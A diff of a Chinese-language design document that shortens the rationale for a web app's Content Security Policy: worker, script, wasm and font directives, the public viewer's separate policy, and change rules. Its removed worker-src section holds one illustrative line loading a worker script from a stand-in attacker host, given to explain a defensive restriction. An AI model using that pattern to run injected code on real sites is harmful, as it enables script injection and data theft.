@@ -1,96 +1,57 @@
-# Web CSP 設計：以「通道」為單位的收斂
+# Web CSP 設計
 
-- Status: Current（enforce 中）
-- 通用化 pattern：[CSP 與 code delivery](../system-design/csp-and-code-delivery.md)
-- 決策記錄：[ADR-0004](../adr/0004-code-delivery-trust-boundary.md)（為什麼 CSP 是
-  defense-in-depth 而非授權機制、各項邊界內妥協的原因）
-- 營運文件：[web security headers](../operations/web-security-headers.md)（header 一覽、
-  allowlist 觸發點表、rollout 程序）
-- 政策單一來源：`apps/web/src/config/security-headers.ts`；測試釘住：
-  `apps/web/tests/security-headers.test.ts`
+本文記錄政策的理由與取捨。Header 值及各來源用途以
+[security-headers.ts](../../apps/web/src/config/security-headers.ts) 為準，
+[政策測試](../../apps/web/tests/security-headers.test.ts) 防止未預期的放寬。
+操作步驟見 [CSP 走查與部署](../operations/web-security-headers.md)。
 
-本文回答「每條 directive 為什麼長這樣」。設計的出發點不是逐條抄安全建議，而是把瀏覽器
-的能力拆成幾類**通道**，每類通道問同一個問題：被注入的程式碼（threat model T16 的
-runtime injection 來源）能用它做什麼？然後收斂到正常功能所需的最小集合。
+## 信任邊界
 
-## 通道模型
+CSP 是額外防線，不是授權機制。`connect-src` 限制 fetch／XHR／WebSocket 的目的地，
+但無法阻止資料送往允許清單內的 origin，也無法對抗能修改應用程式 bundle 的 operator。
+完整邊界見 [ADR-0004](../adr/0004-code-delivery-trust-boundary.md)；通道模型見
+[CSP 與 code delivery](../system-design/csp-and-code-delivery.md)。
 
-| 通道 | Directive | 被注入程式碼能拿它做什麼 | 我們的收斂 |
-| --- | --- | --- | --- |
-| 執行外部程式碼 | `script-src` | 從外部 origin 載入任意 script，以頁面權限執行 | `'self' 'unsafe-inline' 'wasm-unsafe-eval'`；**零外部 origin**（wasm 見下節） |
-| 背景執行程式碼 | `worker-src` | `new Worker(url)` 把程式碼丟進背景執行緒執行 | `'self' blob:`（見下節） |
-| 把資料送出去 | `connect-src` | `fetch`／XHR／WebSocket 外送任意資料（room key 的 exfiltration 通道） | 5 個有明確觸發點的 origin |
-| 內嵌別人 | `frame-src` | 嵌入外部頁面（跨 origin iframe 摸不到父頁） | 精確等於 embed 決策清單 |
-| 被別人內嵌 | `frame-ancestors` | —（防的是 clickjacking，不是注入） | `'none'`＋`X-Frame-Options: DENY` |
-| 改寫解析基準 | `base-uri` | 注入 `<base>` 讓相對路徑 script 指向外部 | `'none'` |
-| 外掛執行 | `object-src` | `<object>`／`<embed>` 舊式執行面 | `'none'` |
-| 表單外送 | `form-action` | 注入表單把輸入送到外部 | `'self'` |
-| 樣式 | `style-src` | 注入 CSS（低風險：無程式碼執行） | `'self' 'unsafe-inline'` |
-| 圖片／字型 | `img-src`／`font-src` | 低風險載入面；仍收斂以縮小出口 | 各自的最小清單；`font-src 'self'`（字型全數自託管，含 `/p` 的 `fonts.css`） |
+## 為什麼保留 inline script 與 wasm
 
-核心觀念（CLAIM-CDB-3）：`connect-src` 是本設計的主控制——它決定 room key「送得出去嗎、
-送得到哪」。`script-src`／`worker-src` 是次控制——它們決定「多容易把惡意程式碼弄進來」。
-CSP 擋不住能改動 bundle 的 operator（T16 accepted limitation），它做的是讓注入後的
-exfiltration 需要繞更多路。
+政策在 build 時產生，沒有 per-request nonce。App Router 的串流 inline script、
+`NextSSRPlugin` 與 `next-themes` 因此仍需要 `'unsafe-inline'`。
+需要外部 script 的 embed 在 validator 拒絕，維持 production 零外部 script origin。
 
-## worker-src 為什麼是 `'self' blob:`
+工作區匯出 SVG／PNG 時，Excalidraw 用 harfbuzz wasm 裁剪字型；`'wasm-unsafe-eval'`
+只放行 wasm 編譯，不開放 JavaScript eval。若 wasm 被擋，上游可能退回 esm.sh 字型 URL，
+又被 CSP 擋下，造成匯出文字落到系統字型。Dev 的 eval 放寬會掩蓋問題，必須驗證 production build。
 
-Web Worker 是「以頁面權限在背景執行 script」的通道，風險等級與 `script-src` 同類：
-不設限時，被注入的程式碼可以 `new Worker("https://attacker.example/evil.js")` 直接拉外部
-程式碼進來跑。
+## 為什麼字型與 worker 限同源
 
-正常功能只有一個使用者：**Excalidraw 的字型 subset worker**。畫布輸入 CJK 文字或匯出時，
-上游在背景 worker 裡把 12MB 級的 CJK 字型裁剪到實際用到的字元，避免主執行緒卡死與匯出
-檔案爆量。該 worker 的 script 由 Next.js 打包在自家 origin（`/_next/static/...`），
-`'self'` 即涵蓋。
+字型由 build script 自託管。編輯器使用上游 FontFace API，公開 viewer 使用同一批字型產生的
+`fonts.css`；發布成品不內嵌字型，因此不需開放外部字型 origin 或 `data:` 字型。
 
-- **`'self'`**：確定需要（subset worker 的實際來源）。
-- **`blob:`**：允許 `URL.createObjectURL()` 產生的記憶體 blob URL 建 worker——常見的程式庫
-  寫法（把 worker 程式碼組成字串→blob→worker）。它比 `'self'` 寬：被注入的程式碼可把任意
-  字串變成 blob worker 執行，等於繞過「worker 必須來自自家檔案」。目前保留是**保守待驗證**
-  ：enforce 下少放一個真正需要的來源會直接壞功能，而 blob worker 仍受頁面 CSP 的
-  `connect-src` 約束（資料仍送不出允許清單之外），所以先寬後收。
-- **收斂條件**：走查（含 CJK 輸入與 SVG/PNG 匯出）全程無 `worker-src`／blob 違規，即可
-  把 `blob:` 移除並同步改測試斷言。這是目前政策中唯一標記「待實測收斂」的來源。
+工作區保留同源 subset worker 的權限。現有走查記錄顯示 Turbopack 的 worker URL 解析失敗時，
+上游會退回主執行緒；匯出成功不代表 worker 已成功啟動。`blob:` 已於初次 enforce 時移除，
+日後調整打包方式需重新驗證 CJK 輸入與匯出。
 
-## script-src 為什麼容忍 'unsafe-inline'（而 worker-src 不需要）
+## 為什麼公開 viewer 有自己的 CSP
 
-靜態 CSP（build 時凍結，無 per-request nonce middleware）無法 hash App Router 逐 request
-串流的 inline flight script，`NextSSRPlugin` 與 `next-themes` 也各注入無 nonce 的 inline
-script——完整推導在 ADR-0004。取捨結果：`script-src` 放棄 inline 防護、堅守「零外部
-origin」；`worker-src` 沒有對應的 inline 需求，因此不需要同等妥協。這也解釋了 embed 決策
-（見 ADR-0004）：twitter/x、reddit、gist 的 embed 需要外部 script origin 才能動，直接在
-validator 層拒絕，讓「零外部 script origin」保持無例外。
+`/p/*` 面向匿名訪客，顯示使用者上傳的 SVG 成品，只需要 app chunks、同源字型與成品下載。
+它不載入 Excalidraw 引擎，也不需要工作區的匯出、共編、上傳或 embed 權限。
+因此公開頁政策維持整站政策的子集，由測試檢查；具體差異留在程式碼。
 
-## script-src 為什麼需要 'wasm-unsafe-eval'
+公開頁仍需要 framework 的 inline script，以及 React 與 SVG 文字的 inline style。
+成品是不可信輸入，必須先經過 `sanitizeSvgArtifact` 與連結處理才能掛入 DOM；
+伺服器也會驗證成品 URL 屬於自家 storage 且與 file key 相符。CSP 是額外限制，不能取代這些檢查。
+成品流程見 [render once, serve many](../system-design/render-once-serve-many.md)。
 
-`script-src` 一旦存在，Chrome 與 Safari 就把 `WebAssembly.instantiate` 視為 eval 的一種：
-沒有 `'unsafe-eval'` 或 `'wasm-unsafe-eval'` 就拒絕編譯（Firefox 較寬鬆，不擋）。
-唯一使用者是 **Excalidraw 的字型 subset（harfbuzz wasm）**：工作區「下載 SVG／PNG」靠它
-把字型裁成子集後以 data URL 內嵌到匯出檔。`/p/[slug]` 的靜態 viewer 曾是第二個使用者，
-改以 `skipInliningFonts` 匯出、字型走 `fonts.css` 後不再依賴（見下節）；是否對 `/p/*`
-發一份不含此關鍵字的 per-route CSP，另開決策。
+CSP 綁在 document 上，App Router 的 soft navigation 不會替換它。
+所以公開 viewer、共用 not-found 與 error 頁離開時使用原生 `<a>` 整頁導覽，
+避免工作區沿用公開頁政策而擋住上傳、共編或匯出。
+`published-viewer-engine-free.test.ts` 檢查相關入口不引入 `next/link`；工作區開公開連結則用新分頁。
 
-失敗模式很安靜：上游把 wasm 錯誤吃掉，改把 `src` 退回候選清單最後一個 URL（esm.sh），
-接著被 `font-src 'self'` 擋下，文字就靜默落到系統字型——沒有錯誤頁、沒有 toast。dev 因為
-本來就放 `'unsafe-eval'` 所以看不出來，只有 production 會壞。
-
-`'wasm-unsafe-eval'` 只放行 wasm 編譯、不放行 `eval()`／`new Function()`，且 wasm 位元組
-仍須先能被載入（同源 chunk），沒有新的外部程式碼進入面；因此屬於「功能必需的最小放寬」，
-不是對「零外部 origin」的退讓。
-
-## font-src 為什麼是 `'self'`（曾經含 `data:`）
-
-`/p/[slug]` 的靜態 viewer 曾直接把 `exportToSvg` 內嵌了 base64 字型的 SVG 掛進 document，
-因此 `font-src` 一度放行 `data:`。viewer 改以 `skipInliningFonts` 匯出後，畫布字型由 build 時
-從自託管 woff2 產生的 `/excalidraw-assets/fonts.css` 宣告（帶 `unicode-range`，見
-[static-export-as-read-only-viewer §1b](../system-design/static-export-as-read-only-viewer.md)），
-與編輯器一樣全部落在 `'self'`，`data:` 隨之移除。
+`next.config.ts` 將公開頁規則放在整站規則之後，以同名 header 覆蓋整站 CSP；
+兩者共用 `CSP_REPORT_ONLY`，驗證程序統一放在營運文件。
 
 ## 變更守則
 
-1. 任何 directive 要新增來源，先回答：它屬於哪個通道？正常路徑（不是錯誤路徑）真的需要
-   嗎？——判準見 ADR-0004 的字型自託管 trade-off 一節：能 self-host 就不 allowlist。
-2. 改 `apps/web/src/config/security-headers.ts` 前，先更新測試與營運文件的觸發點表；
-   政策、測試、文件三者由同一次 commit 對齊。
-3. 走 report-only 重新走查再 enforce（程序見營運文件）。
+1. 新增來源前確認是哪個正常功能需要；能自託管就不新增外部來源，不為錯誤 fallback 放寬。
+2. 同步修改政策、來源旁的用途註解與測試。只有設計理由改變時才改本文，驗證步驟改變時才改營運文件。
+3. 依 [CSP 走查與部署](../operations/web-security-headers.md) 驗證後 enforce。
